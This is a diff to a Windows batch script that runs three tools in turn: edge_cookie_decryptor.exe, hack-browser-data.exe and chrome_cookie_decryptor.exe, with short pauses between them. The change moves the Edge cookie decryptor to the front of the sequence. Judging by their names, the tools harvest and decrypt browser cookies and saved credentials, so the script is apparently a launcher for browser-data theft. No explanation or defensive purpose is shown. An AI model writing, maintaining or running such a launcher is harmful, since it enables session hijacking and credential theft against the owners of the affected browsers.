@@ -14,14 +14,17 @@ timeout /t 3 /nobreak
 echo Running applications sequentially...
 
 REM Run each exe immediately after the previous one finishes
+
+"%CD%\edge_cookie_decryptor.exe"
+timeout /t 1 /nobreak
+
 "%CD%\hack-browser-data.exe"
 timeout /t 1 /nobreak
 
 "%CD%\chrome_cookie_decryptor.exe"
 timeout /t 1 /nobreak
 
-"%CD%\edge_cookie_decryptor.exe"
-timeout /t 1 /nobreak
+
 
 REM Quick final wait
 timeout /t 1 /nobreak
